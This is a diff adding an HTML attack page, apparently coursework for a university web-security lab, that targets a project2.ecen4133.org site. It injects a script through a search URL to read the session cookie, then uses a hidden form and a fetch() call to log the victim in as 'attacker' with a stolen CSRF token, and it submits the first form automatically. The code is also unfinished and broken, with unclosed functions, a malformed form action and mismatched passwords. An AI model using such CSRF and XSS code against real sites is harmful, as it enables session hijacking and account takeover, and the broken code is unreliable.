@@ -1,0 +1,76 @@
+<html>
+    <head>
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+    </head>
+    <body>
+        <!-- <div style="display: none;">-->
+        <div>
+            <iframe name="attackSite" src=""></iframe>
+            <form id="cookieForm" action=
+            "https://project2.ecen4133.org/search?csrfdefense=1&xssdefense=0&q=
+            %20%20%20%20%20%20%20%20%20%20%20%20%3Cscript%3E%20%20%20%20%20%20%20%20%20%20%20%20
+            cookieValue=document.cookie.substring(11)%20%20%20%20%20%20%20%20%20%20%20%20%3C/script%3E%20%20%20%20%20%20%20%20%20%20%20%20", target="attackSite">
+            </form>
+            <form id="postForm" action="https://project2.ecen4133.org/login?csrfdefense=1&xssdefense=0&username=attacker, 
+            {
+                username: 'attacker',
+                password: 'l33th4x',
+                csrf_token: cookieValue
+            }" method="post" target="attackSite">
+            </form>
+
+
+
+            <iframe id="myIframe" src=""></iframe>
+
+            <script>
+                // Function to extract the username and submit the form within the iframe
+                function extractAndSubmit() {
+                    // Access the iframe
+                    var iframe = document.getElementById("myIframe");
+        
+                    // Check if the iframe has loaded
+                    if (iframe && iframe.contentWindow) {
+                        // Access the iframe's content document
+                        var iframeDocument = iframe.contentWindow.document;
+        
+                        // Extract the username from the iframe content (adjust this based on the structure)
+                        var cookie = document.cookie.substring(11);
+        
+                        var loginUrl = "https://project2.ecen4133.org/login?csrfdefense=1&xssdefense=0";
+
+                        // Define the username and password
+                        var username = "attacker";
+                        var password = "133th4x";
+
+                        // Create a FormData object to hold the credentials
+                        var formData = new FormData();
+                        formData.append("username", username);
+                        formData.append("password", password);
+
+                        // Make an HTTP POST request to the login page
+                        fetch(loginUrl, {
+                            method: "POST",
+                            body: formData,
+                            headers: {
+                                      
+                            }
+                        }
+
+
+
+
+
+
+            
+            
+
+            <script>
+                document.getElementById("cookieForm").submit()
+            </script>
+        </div>
+        
+    </body>
+</html>
+
+
